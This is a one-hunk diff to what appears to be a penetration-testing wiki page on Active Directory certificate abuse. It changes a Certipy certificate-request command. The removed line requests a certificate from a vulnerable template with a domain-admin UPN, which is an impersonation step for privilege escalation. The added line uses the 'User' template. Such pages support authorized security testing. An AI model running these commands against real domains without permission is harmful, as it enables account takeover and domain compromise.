@@ -35,7 +35,7 @@ This check can be conducted using [Certipy](https://www.google.com/url?sa=t\&rct
 
 {% code overflow="wrap" %}
 ```bash
-ccertipy req -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'
+certipy req -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'User'
 ```
 {% endcode %}
 
